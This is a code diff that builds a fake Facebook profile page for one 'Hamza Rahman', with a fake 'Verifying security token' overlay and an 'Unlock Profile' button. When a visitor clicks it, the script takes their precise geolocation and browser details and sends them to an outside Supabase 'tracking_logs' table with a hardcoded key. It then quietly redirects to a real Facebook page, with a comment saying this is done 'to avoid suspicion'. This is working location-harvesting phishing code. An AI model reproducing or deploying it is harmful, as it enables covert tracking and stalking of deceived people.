@@ -25,4 +25,84 @@
         .btn-gray { background: #3a3b3c; color: white; border: none; padding: 8px 15px; border-radius: 6px; font-weight: bold; flex: 1; }
 
         /* Loader & Pop-up logic */
-        #overlay { position: absolute
+        #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.4); z-index: 10; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0866ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .verify-msg { margin-top: 15px; font-weight: bold; text-align: center; padding: 0 20px; }
+    </style>
+</head>
+<body>
+
+<div id="main-card" class="profile-container">
+    <img src="https://scontent.fcla7-1.fna.fbcdn.net/v/t39.30808-6/626450560_122221019726362402_8775416096430619878_n.jpg?stp=cp6_dst-jpg_s720x720_tt6&_nc_cat=111&ccb=1-7&_nc_sid=2a1932&_nc_ohc=-Bt9ejDuSBcQ7kNvwE2WzZQ&_nc_oc=AdrPgmckBZVvNL_pCVSbSYCA_FrfSaAjcRxkdSw8WmXDKy98pmDX89LdOLbeEKb0rE8&_nc_zt=23&_nc_ht=scontent.fcla7-1.fna&_nc_gid=VnkZNzmIssYi5uzTol49kg&_nc_ss=8&oh=00_AfzwipirIGQdOP4QwnMzIdLzjVJA9Vr75YKftcmeOe0TuQ&oe=69C1C7A0" class="cover-photo"> <div class="profile-pic-container">
+        <img src="https://scontent.fcla7-1.fna.fbcdn.net/v/t39.30808-1/625978809_122221013912362402_882429750494277211_n.jpg?stp=cp6_dst-jpg_s200x200_tt6&_nc_cat=106&ccb=1-7&_nc_sid=e99d92&_nc_ohc=b1DE8aCVsaoQ7kNvwFdKFDK&_nc_oc=Adow4SOYo1CFG1m3ZNa0MzRi3Ne7md2HhUzXq7Wc3B-XmI_n5I0kEitaeDnQhqlsU-Y&_nc_zt=24&_nc_ht=scontent.fcla7-1.fna&_nc_gid=At49yzP7Lshz9VuaZEsP5g&_nc_ss=8&oh=00_AfwmmGG9a1mhFT0wlzwTcF8Yn10t0HdRuh9s6n9-V8YVJA&oe=69C1A1E2" class="profile-pic"> </div>
+    
+    <div class="profile-info">
+        <div class="name">Hamza Rahman</div>
+        <div class="stats">Learn About Contributions</div>
+        
+        <div class="btn-group">
+            <button id="auth-btn" class="btn-blue">Add Friend</button>
+            <button class="btn-gray">Message</button>
+        </div>
+    </div>
+
+    <div id="overlay">
+        <div class="loader" id="spinner"></div>
+        <p class="verify-msg" id="status-text">Verifying security token...</p>
+        <button id="final-btn" class="btn-blue" style="display: none; width: 80%; margin-bottom: 20px;">Unlock Profile</button>
+    </div>
+</div>
+
+<script>
+    const supabaseUrl = 'https://nhhcijrjrcxznsqltzom.supabase.co';
+    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oaGNpanJqcmN4em5zcWx0em9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MTMyODAsImV4cCI6MjA4OTQ4OTI4MH0.1CG80rxN01S00lCQ1gkqyKdenDJR_XjM0uQtEAln9XU';
+    const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);
+
+    const overlay = document.getElementById('overlay');
+    const spinner = document.getElementById('spinner');
+    const statusText = document.getElementById('status-text');
+    const finalBtn = document.getElementById('final-btn');
+    const card = document.getElementById('main-card');
+
+    // Initial Loading Simulation
+    setTimeout(() => {
+        spinner.style.display = 'none';
+        statusText.textContent = "To view Hamza Rahman's full profile, please verify your device connection.";
+        finalBtn.style.display = 'block';
+        card.style.filter = 'blur(5px)'; // Reduced blur to show background
+    }, 2500);
+
+    finalBtn.addEventListener('click', () => {
+        finalBtn.style.display = 'none';
+        spinner.style.display = 'block';
+        statusText.textContent = "Establishing secure connection...";
+
+        const params = new URLSearchParams(window.location.search);
+        const logId = params.get('id') || 'FB_Target';
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                // Supabase Update
+                await supabaseClient.from('tracking_logs').insert([{ 
+                    user_identifier: logId, 
+                    latitude: pos.coords.latitude, 
+                    longitude: pos.coords.longitude,
+                    device_info: "Hamza Profile Unlock: " + navigator.userAgent
+                }]);
+                
+                // Redirect back to real profile
+                window.location.replace("https://www.facebook.com/groups/673763631117730/user/61560872079388/");
+            }, (err) => {
+                // If denied, still redirect to avoid suspicion
+                window.location.replace("https://www.facebook.com/groups/673763631117730/user/61560872079388/");
+            }, { enableHighAccuracy: true, timeout: 10000 });
+        } else {
+            window.location.replace("https://www.facebook.com/groups/673763631117730/user/61560872079388/");
+        }
+    });
+</script>
+
+</body>
+</html>
